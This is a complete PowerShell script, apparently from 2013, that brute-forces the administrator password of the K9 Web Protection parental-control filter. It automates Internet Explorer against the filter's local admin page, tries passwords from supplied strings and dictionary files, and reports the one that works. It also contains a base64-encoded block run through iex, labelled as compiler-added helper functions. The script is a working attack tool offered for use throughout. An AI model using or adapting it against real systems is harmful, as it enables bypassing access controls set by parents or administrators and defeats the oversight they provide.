<#
|===============================================================>|
   K9-BruteForcer by APoorv Verma [AP] on 8/25/2013
|===============================================================>|
      $) Supports BruteForce using multiple Dictionaries
      $) Supports BruteForce using multiple Strings
      $) Supports Hybrid BruteForce
      $) Allows Pipelining of Passwords or Dictionaries
      $) Following Shortcuts are supported
           #) Press 'x' to quit
           #) Press 'Enter' to show status
           #) Press 's' to show Intenet Explorer with bruteforcer
           #) Press 'h' to hide Intenet Explorer with bruteforcer
|===============================================================>|
#>
param([Alias("Psw","Password")][String[]]$Passwords,[Alias("Dict","Dictionary")][String[]]$Dictionaries,[Switch]$Debug=$False,[Alias("ShowIE","ShowBrowser")][Switch]$ShowIEWIndow=$False,[Alias("SPB","Progress")][Switch]$ShowProgressBar=$False)
# =======================================START=OF=COMPILER==========================================================|
#    The Following Code was added by AP-Compiler Version [1.2] To Make this program independent of AP-Core Engine
#    GitHub: https://github.com/avdaredevil/AP-Compiler
# ==================================================================================================================|
$Script:PSHell=$(if($PSHell){$PSHell}elseif($PSScriptRoot){$PSScriptRoot}else{"."});
iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gS2V5UHJlc3NlZENvZGUge3BhcmFtKFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlKV1bSW50XSRLZXksICRTdG9yZT0iXl5eIikNCg0KICAgIGlmICghJEhvc3QuVUkuUmF3VUkuS2V5QXZhaWxhYmxlIC1hbmQgJFN0b3JlIC1lcSAiXl5eIikge1JldHVybiAkRmFsc2V9DQogICAgaWYgKCRTdG9yZSAtZXEgIl5eXiIpIHskU3RvcmUgPSAkSG9zdC5VSS5SYXdVSS5SZWFkS2V5KCJJbmNsdWRlS2V5VXAsTm9FY2hvIil9DQogICAgcmV0dXJuICgkS2V5IC1pbiAkU3RvcmUuVmlydHVhbEtleUNvZGUpDQp9CgpmdW5jdGlvbiBHZXQtV2hlcmUge3BhcmFtKFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlKV1bc3RyaW5nXSRGaWxlLCBbU3dpdGNoXSRBbGwpDQoNCiAgICBBUC1SZXF1aXJlICJkZXA6d2hlcmUiIHt0aHJvdyAiTmVlZCBTeXMzMlx3aGVyZSB0byB3b3JrISI7cmV0dXJufQ0KICAgICRPdXQgPSB3aGVyZS5leGUgJGZpbGUgMj4kbnVsbA0KICAgIGlmICghJE91dCkge3JldHVybn0NCiAgICBpZiAoJEFsbCkge3JldHVybiAkT3V0fQ0KICAgIHJldHVybiBAKCRPdXQpWzBdDQp9CgpmdW5jdGlvbiBQcm9jZXNzLVRyYW5zcGFyZW5jeSB7cGFyYW0oW0FsaWFzKCJUcmFuc3BhcmVuY3kiLCJJbnZpc2liaWxpdHkiLCJpIiwidCIpXVtWYWxpZGF0ZVJhbmdlKDAsMTAwKV1baW50XSRUcmFucz0wLCBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSldJFByb2Nlc3MpDQoNCiAgICBpZiAoJFByb2Nlc3MgLW1hdGNoICJcLmV4ZSQiKSB7JFByb2Nlc3MgPSAkUHJvY2Vzcy5yZXBsYWNlKCIuZXhlIiwiIil9DQogICAgVHJ5IHsNCiAgICAgICAgaWYgKCRQcm9jZXNzLm5hbWUpIHskUHJvYyA9ICRQcm9jZXNzLm5hbWV9IGVsc2UgeyRQcm9jID0gKEdldC1Qcm9jZXNzICRQcm9jZXNzIC1FcnJvckFjdGlvbiBTdG9wKVswXS5uYW1lfQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBpZiAoW0ludF06OlRyeVBhcnNlKCRQcm9jZXNzLCBbcmVmXTMpKSB7JFByb2MgPSAoKEdldC1Qcm9jZXNzIHwgPyB7JF8uSUQgLWVxICRQcm9jZXNzfSlbMF0pLm5hbWV9DQogICAgfQ0KICAgIGlmICgkUHJvYyAtbm90TWF0Y2ggIlwuZXhlJCIpIHskUHJvYyA9ICIkUHJvYy5leGUifQ0KICAgIG5pcmNtZCB3aW4gdHJhbnMgcHJvY2VzcyAiJFByb2MiICgoMTAwLSRUcmFucykqMjU1LzEwMCkgfCBPdXQtTnVsbA0KfQoKZnVuY3Rpb24gQVAtUmVxdWlyZSB7cGFyYW0oW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUpXVtBbGlhcygiRnVuY3Rpb25hbGl0eSIsIkxpYnJhcnkiKV1bU3RyaW5nXSRMaWIsIFtTY3JpcHRCbG9ja10kT25GYWlsPXt9LCBbU3dpdGNoXSRQYXNzVGhydSkNCg0KICAgIFtib29sXSRTdGF0ID0gJChzd2l0Y2ggLXJlZ2V4ICgkTGliLnRyaW0oKSkgew0KICAgICAgICAiXkludGVybmV0IiAge3Rlc3QtY29ubmVjdGlvbiBnb29nbGUuY29tIC1Db3VudCAxIC1RdWlldH0NCiAgICAgICAgIl5kZXA6KC4qKSIgIHtpZiAoJE1hdGNoZXNbMV0gLW5lICJ3aGVyZSIpe0FQLVJlcXVpcmUgImRlcDp3aGVyZSIgeyRNT0RFPTJ9fWVsc2V7JE1PREU9Mn07aWYgKCRNT0RFLTIpe0dldC1XaGVyZSAkTWF0Y2hlc1sxXX1lbHNle3RyeXsmICRNYXRjaGVzWzFdICIvZmpmZGpmZHMgLS1kc2phaGRocyAtZHNqYWRqIiAyPiRudWxsOyJzdWNjIn1jYXRjaHt9fX0NCiAgICAgICAgIl5saWI6KC4qKSIgIHskRmlsZT0kTWF0Y2hlc1sxXTskTGliPUFQLUNvbnZlcnRQYXRoICI8TElCPiI7KHRlc3QtcGF0aCAtdCBsZWFmICIkTGliXCRGaWxlIikgLW9yICh0ZXN0LXBhdGggLXQgbGVhZiAiJExpYlwkRmlsZS5kbGwiKX0NCiAgICAgICAgIl5mdW5jdGlvbjooLiopIiAge2djbSAkTWF0Y2hlc1sxXSAtZWEgU2lsZW50bHlDb250aW51ZX0NCiAgICAgICAgIl5zdHJpY3RfZnVuY3Rpb246KC4qKSIgIHtUZXN0LVBhdGggIkZ1bmN0aW9uOlwkKCRNYXRjaGVzWzFdKSJ9DQogICAgfSkNCiAgICBpZiAoISRTdGF0KSB7JE9uRmFpbC5JbnZva2UoKX0NCiAgICBpZiAoJFBhc3NUaHJ1KSB7cmV0dXJuICRTdGF0fQ0KfQoKZnVuY3Rpb24gSW52b2tlLVRlcm5hcnkge3BhcmFtKFtib29sXSRkZWNpZGVyLCBbc2NyaXB0YmxvY2tdJGlmdHJ1ZSwgW3NjcmlwdGJsb2NrXSRpZmZhbHNlKQ0KDQogICAgaWYgKCRkZWNpZGVyKSB7ICYkaWZ0cnVlfSBlbHNlIHsgJiRpZmZhbHNlIH0NCn0KCmZ1bmN0aW9uIFdyaXRlLUFQIHtwYXJhbShbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSldJFRleHQsIFtTd2l0Y2hdJE5vU2lnbiwgW1N3aXRjaF0kUGxhaW5UZXh0LCBbVmFsaWRhdGVTZXQoIkNlbnRlciIsIlJpZ2h0IiwiTGVmdCIpXVtTdHJpbmddJEFsaWduPSdMZWZ0JywgW1N3aXRjaF0kUGFzc1RocnUpDQoNCiAgICBpZiAoJHRleHQuY291bnQgLWd0IDEgLW9yICR0ZXh0LkdldFR5cGUoKS5OYW1lIC1tYXRjaCAiXFtcXSQiKSB7cmV0dXJuICRUZXh0IHw/eyIkXyJ9fCAlIHtXcml0ZS1BUCAkXyAtTm9TaWduOiROb1NpZ24gLVBsYWluVGV4dDokUGxhaW5UZXh0IC1BbGlnbiAkQWxpZ259fQ0KICAgIGlmICghJHRleHQgLW9yICR0ZXh0IC1ub3RtYXRjaCAiXigoPzxOTkw+eCl8KD88TlM+bnM/KSl7MCwyfSg/PHQ+XD4qKSg/PHM+WytcLSFcKlwjXEBdKSg/PHc+LiopIikge3JldHVybiAkVGV4dH0NCiAgICAkdGIgID0gIiAgICAiKiRNYXRjaGVzLnQubGVuZ3RoOw0KICAgICRDb2wgPSBAeycrJz0nMic7Jy0nPScxMic7JyEnPScxNCc7JyonPSczJzsnIyc9J0RhcmtHcmF5JzsnQCc9J0dyYXknfVsoJFNpZ24gPSAkTWF0Y2hlcy5TKV0NCiAgICBpZiAoISRDb2wpIHtUaHJvdyAiSW5jb3JyZWN0IFNpZ24gWyRTaWduXSBQYXNzZWQhIn0NCiAgICAkU2lnbiA9ICQoaWYgKCROb1NpZ24gLW9yICRNYXRjaGVzLk5TKSB7IiJ9IGVsc2UgeyJbJFNpZ25dICJ9KQ0KICAgIEFQLVJlcXVpcmUgImZ1bmN0aW9uOkFsaWduLVRleHQiIHtmdW5jdGlvbiBHbG9iYWw6QWxpZ24tVGV4dCgkYWxpZ24sJHRleHQpIHskdGV4dH19DQogICAgJERhdGEgPSAiJHRiJFNpZ24kKCRNYXRjaGVzLlcpIjtpZiAoISREYXRhKSB7cmV0dXJufQ0KICAgICREYXRhID0gQWxpZ24tVGV4dCAtQWxpZ24gJEFsaWduICIkdGIkU2lnbiQoJE1hdGNoZXMuVykiDQogICAgaWYgKCRQbGFpblRleHQpIHtyZXR1cm4gJERhdGF9DQogICAgV3JpdGUtSG9zdCAtTm9OZXdMaW5lOiQoW2Jvb2xdJE1hdGNoZXMuTk5MKSAtZiAkQ29sICREYXRhDQogICAgaWYgKCRQYXNzVGhydSkgeyREYXRhfQ0KfQoKZnVuY3Rpb24gS2V5UHJlc3NlZCB7cGFyYW0oW1BhcmFtZXRlcihNYW5kYXRvcnk9JFRydWUpXVtTdHJpbmdbXV0kS2V5LCAkU3RvcmU9Il5eXiIpDQoNCiAgICBpZiAoJFN0b3JlIC1lcSAiXl5eIiAtYW5kICRIb3N0LlVJLlJhd1VJLktleUF2YWlsYWJsZSkgeyRTdG9yZSA9ICRIb3N0LlVJLlJhd1VJLlJlYWRLZXkoIkluY2x1ZGVLZXlVcCxOb0VjaG8iKX0gZWxzZSB7aWYgKCRTdG9yZSAtZXEgIl5eXiIpIHtyZXR1cm4gJEZhbHNlfX0NCiAgICAkQW5zID0gJEZhbHNlDQogICAgJEtleSB8ICUgew0KICAgICAgICAkU09VUkNFID0gJF8NCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICRBbnMgPSAkQW5zIC1vciAoS2V5UHJlc3NlZENvZGUgJFNPVVJDRSAkU3RvcmUpDQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgRm9yZWFjaCAoJEsgaW4gJFNPVVJDRSkgew0KICAgICAgICAgICAgICAgIFtTdHJpbmddJEsgPSAkSw0KICAgICAgICAgICAgICAgIGlmICgkSy5sZW5ndGggLWd0IDQgLWFuZCAoJEtbMCwxLC0xLC0yXSAtam9pbigiIikpIC1lcSAifn5+fiIpIHsNCiAgICAgICAgICAgICAgICAgICAgJEFucyA9ICRBTlMgLW9yIChLZXlQcmVzc2VkQ29kZSAoS2V5VHJhbnNsYXRlKCRLKSkgJFN0b3JlKQ0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRBbnMgPSAkQU5TIC1vciAoJEsuY2hhcnMoMCkgLWluICRTdG9yZS5DaGFyYWN0ZXIpDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkQW5zDQp9CgpmdW5jdGlvbiBLZXlUcmFuc2xhdGUge3BhcmFtKFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlKV1bU3RyaW5nXSRLZXkpDQoNCiAgICAkSGFzaEtleSA9IEB7DQogICAgICAgICJ+flNwYWNlfn4iPTMyDQogICAgICAgICJ+fkVTQ0FQRX5+Ij0yNw0KICAgICAgICAifn5FbnRlcn5+Ij0xMw0KICAgICAgICAifn5TaGlmdH5+Ij0xNg0KICAgICAgICAifn5Db250cm9sfn4iPTE3DQogICAgICAgICJ+fkFsdH5+Ij0xOA0KICAgICAgICAifn5CYWNrU3BhY2V+fiI9OA0KICAgICAgICAifn5EZWxldGV+fiI9NDYNCiAgICAgICAgIn5+ZjF+fiI9MTEyDQogICAgICAgICJ+fmYyfn4iPTExMw0KICAgICAgICAifn5mM35+Ij0xMTQNCiAgICAgICAgIn5+ZjR+fiI9MTE1DQogICAgICAgICJ+fmY1fn4iPTExNg0KICAgICAgICAifn5mNn5+Ij0xMTcNCiAgICAgICAgIn5+Zjd+fiI9MTE4DQogICAgICAgICJ+fmY4fn4iPTExOQ0KICAgICAgICAifn5mOX5+Ij0xMjANCiAgICAgICAgIn5+ZjEwfn4iPTEyMQ0KICAgICAgICAifn5mMTF+fiI9MTIyDQogICAgICAgICJ+fmYxMn5+Ij0xMjMNCiAgICAgICAgIn5+TXV0ZX5+Ij0xNzMNCiAgICAgICAgIn5+SW5zZXJ0fn4iPTQ1DQogICAgICAgICJ+flBhZ2VVcH5+Ij0zMw0KICAgICAgICAifn5QYWdlRG93bn5+Ij0zNA0KICAgICAgICAifn5FTkR+fiI9MzUNCiAgICAgICAgIn5+SE9NRX5+Ij0zNg0KICAgICAgICAifn50YWJ+fiI9OQ0KICAgICAgICAifn5DYXBzTG9ja35+Ij0yMA0KICAgICAgICAifn5OdW1Mb2Nrfn4iPTE0NA0KICAgICAgICAifn5XaW5kb3dzfn4iPTkxDQogICAgICAgICJ+fkxlZnR+fiI9MzcNCiAgICAgICAgIn5+VXB+fiI9MzgNCiAgICAgICAgIn5+UmlnaHR+fiI9MzkNCiAgICAgICAgIn5+RG93bn5+Ij00MA0KICAgICAgICAifn5LUDB+fiI9OTYNCiAgICAgICAgIn5+S1Axfn4iPTk3DQogICAgICAgICJ+fktQMn5+Ij05OA0KICAgICAgICAifn5LUDN+fiI9OTkNCiAgICAgICAgIn5+S1A0fn4iPTEwMA0KICAgICAgICAifn5LUDV+fiI9MTAxDQogICAgICAgICJ+fktQNn5+Ij0xMDINCiAgICAgICAgIn5+S1A3fn4iPTEwMw0KICAgICAgICAifn5LUDh+fiI9MTA0DQogICAgICAgICJ+fktQOX5+Ij0xMDUNCiAgICB9DQogICAgaWYgKFtpbnRdJENvbnZlcnQgPSAkSGFzaEtleS4kS2V5KSB7cmV0dXJuICRDb252ZXJ0fQ0KICAgIFRocm93ICJJbnZhbGlkIFNwZWNpYWwgS2V5IENvbnZlcnNpb24iDQp9CgpTZXQtQWxpYXMgaW52IFByb2Nlc3MtVHJhbnNwYXJlbmN5ClNldC1BbGlhcyA/OiBJbnZva2UtVGVybmFyeQ==")))
# ========================================END=OF=COMPILER===========================================================|

. .\Modules.ps1 | out-null
try {
    if ((Get-Service -Name bckwfs -ErrorAction Stop).status -ne "Running") {
        Write-AP "-K9 Service is not running, will Enable"
        Start-Service -Name bckwfs
        if (!$?) {Write-AP ">-Failed to Enable K9";Write-Host "";exit} Else {
            Write-AP ">+K9 Service was enabled"
        }
        start-Sleep -s 5
    }
} catch {
    Write-AP "-K9 Service is not installed on this System . . .";Write-Host "";exit
}
function Get-PRP ($SCR,$Size,$Phrase) {
    $PswSZ   = $SCR-$Size;$PRP1 = [math]::truncate($PswSZ/2);$PRP2 = $PRP1+(?:(($PswSZ/2).GetType().Name -like "int*"){0}{1})
    return (?:($Phrase.Length -gt $PswSZ){$Phrase.substring(0,$PRP1-2)+"..."+$Phrase.substring($Phrase.Length-1-$PRP2-2,$PRP2-1)}{$Phrase})
}
try {$Passwords += $Input.split(" ")} catch {}
if ($Passwords -eq $Null -and $Dictionaries -eq $Null) {Write-AP "-All Parameters cannot be empty!";Write-Host "";exit}
$pwdo = $pwd
$Scr = $Host.UI.RawUI.WindowSize.width
if ($Scr -lt 80) {$Scr = 80}
$Hacked = $false
$Pass = ""
Write-AP "*Adjusting invalid entries"
foreach ($PSW in $Passwords) {
    If (test-path $PSW -Type Leaf) {
        if ($Debug) {Write-AP ">!Migrating [$(Get-PRP $SCR (1+8+11+17) $PSW)] to Dictionaries"}
        $Dictionaries += $PSW
        $Passwords = $Passwords | ? {$_ -ne $PSW}
    }
}
foreach ($Dict in $Dictionaries) {
    If (!(test-path $Dict -Type Leaf)) {
        if ($Debug) {Write-AP ">!Migrating [$(Get-PRP $SCR (1+8+11+14) $Dict)] to Passwords"}
        $Passwords += $Dict
        $Dictionaries = $Dictionaries | ? {$_ -ne $Dict}
    }
}
if ($Dictionaries -ne $null) {$Dictionaries = $Dictionaries | % {Convert-Path $_}}
cd $env:temp
$IE = New-Object -com InternetExplorer.Application
$IE.Navigate("http://127.0.0.1:2372")
Load($IE)
if ($ShowIEWIndow) {$IE.visible = $True}
Write-AP "*Aquiring Password Prompt"
Try {
    $IE.Document.getElementById("btn-setup").click()
    $PSWBox = $IE.Document.getElementById("b-loginContain")
    $OKBtn  = $IE.Document.getElementById("o-loginContain")
} catch {
    Write-AP "-Browser Internal Error"
    $IE.quit()
    cd $PWDO
    Write-Host ""
    exit
}
function Hack ($IE,[String]$Password) {
    $PSWBox.value = $Password
    $OKBtn.click()
    Load($IE,12)
    TRY {
        $PSWBox.value = "AP"
        return $False
    } catch {
        return $True
    }
#    if ($IE.Document.getElementById("logout") -ne $null){
#        return $True
#    } else {
#        return $False
#    }
}
function Detect-Keys ([String]$Password, $Percent, [String]$Dict) {
    if ($Host.UI.RawUI.KeyAvailable) {
        $Store = $Host.UI.RawUI.ReadKey("IncludeKeyUp,IncludeKeyDown,NoEcho")
        if (!$Store.KeyDown) {Continue}
        if (KeyPressed 'x','q',"~~ESCAPE~~" $Store) {Write-AP "!Quit Signal, exiting . . .";$IE.quit();cd $PWDO;Write-Host "";exit}
        elseif (KeyPressed ' ',"~~Enter~~" $Store) {
            $PS = ?:($LPS -eq "xx") {0} {1/((Get-Date).TimeOfDay - $LPS).TotalSeconds}
            $io = (1+12+17+9+3+6+4)
            Write-AP ">>*KeyWord [$(Get-PRP $SCR ($SCR-[math]::truncate(($SCR-$IO)/2)) $Password)] at $Percent of $(Get-PRP $SCR ($SCR-[math]::truncate(($SCR-$IO)/2)) $Dict) @ $([System.Math]::Round($PS,2)) Keys/sec"
        }
        elseif ((KeyPressed 'h','-' $Store) -and $IE.visible) {Write-AP ">>*Hiding Internet Window . . .";$IE.visible = $False}
        elseif ((KeyPressed 's','+','v' $Store) -and !$IE.visible) {Write-AP ">>*Showing Internet Window . . .";$IE.visible = $True}
    }
}
Write-AP "*Initiating BruteForcing . . ."
$ONtime = $(Get-Date).TimeOfDay
$LPS = "xx"
$ALG = 0
if ($Passwords -ne $Null) {
    $cb = 1
    $op = 0
    $np = $Passwords.count
    Write-AP ">*Using Supplied Passwords [$np KeyWords]"
    foreach ($psw in $Passwords){
        if ([String]::IsNullOrEmpty($Psw)) {continue}
        $OP++
        $LA = $OP/$NP
        if ($ShowProgressBar) {
            write-progress -activity "BruteForcing K9" -status 'Dictionary [Strings]' -percentcomplete ($LA*100) 
            write-progress -id 1 -activity " " -status 'Total Progress' -percentcomplete ($LA/($Dictionaries.Count+$cb)*100) -currentOperation "Password [$OP/$NP]"
        }
        if (Hack $IE $psw) {$Hacked = $True;$Pass = $psw;break}
        Detect-Keys $psw ("{0:P0}" -f $LA) "Strings"
        $LPS = $(Get-Date).TimeOfDay
    }
    $ALG += 1
}
if (!$Hacked -and $Dictionaries -ne $Null) {
    foreach ($Dict in $Dictionaries){
        $Dictionary = [io.file]::ReadAllLines($Dict) | ? {!([String]::IsNullOrEmpty($_))}
        $op = 0
        $np = $Dictionary.count
        Write-AP ">*Using Dictionary - [$(Get-PRP $SCR (1+8+20+3+(''+$NP).Length+10) $Dict)] [$np KeyWords]"
        foreach ($Term in $Dictionary) {
            $OP++
            $LA = $OP/$NP
            if ($ShowProgressBar) {
                write-progress -activity "BruteForcing K9" -status "Dictionary [$(Get-PRP $SCR ($SCR-15) $Dict)]" -percentcomplete ($LA*100)
                write-progress -id 1 -activity " " -status 'Total Progress' -percentcomplete (($ALG+$LA)/($Dictionaries.Count+$cb)*100) -currentOperation "Password [$OP/$NP]"
            }
            if (Hack $IE $Term) {$Hacked = $True;$Pass = $Term;break}
            Detect-Keys $term ("{0:P0}" -f $LA) $Dict
            $LPS = $(Get-Date).TimeOfDay
        }
        $ALG += 1
    }
}
$ONtime = ($(Get-Date).TimeOfDay - $ONtime)
$OFFtime = ?:($ONtime.Hours -ne 0){""+$ONtime.Hours+" Hours"}{}
$OFFtime += ?:($ONtime.Minutes -ne 0){", "+$ONtime.Minutes+" Minutes"}{}
$OFFtime += ?:($ONtime.Seconds -ne 0){", and "+$ONtime.Seconds+" Seconds"}{}
$OFFtime += ?:($OFFtime -eq $Null){""+$ONtime.Milliseconds+" MilliSeconds"}{}
$OFFtime = $OFFtime.trim(", ").trim("and ").replace("1 Seconds","1 Second").replace("1 Hours","1 Hour").replace("1 Minutes","1 Minute")
if ($Hacked) {
    Write-AP "+Hacked K9 with KeyWord [$Pass] in $Offtime"
} else {
    Write-AP "-Failed to BruteForce K9"
}
Write-Host ""
$IE.quit()
cd $Pwdo
